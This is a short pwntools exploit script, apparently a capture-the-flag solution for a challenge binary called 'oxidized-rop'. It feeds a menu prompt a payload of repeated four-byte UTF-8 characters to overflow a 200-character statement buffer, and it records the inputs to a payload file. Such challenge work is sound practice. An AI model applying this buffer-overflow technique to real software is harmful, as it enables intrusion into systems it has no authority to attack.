import pathlib

from pwn import *

import utils.target

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'oxidized-rop.recomp'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

target_offset = 0x96

target = utils.target.start(exe=str(exe), gdb_script=gdb_script)
payload = ('\xF0\x92\x80\x80' * 0x25).encode('utf-8')


def sendline(__b, file, encoding='utf-8'):
    target.sendline(__b)
    file.write(__b + '\n'.encode(encoding))


with open(parent_dir / 'payload.bin', 'wb') as payload_file:
    target.recvuntil(b'Selection: ')
    sendline(b'1', payload_file)

    target.recvuntil(b'Statement (max 200 characters): ')

    sendline(payload, payload_file)

    sendline(b'2', payload_file)

    sendline(b'3', payload_file)
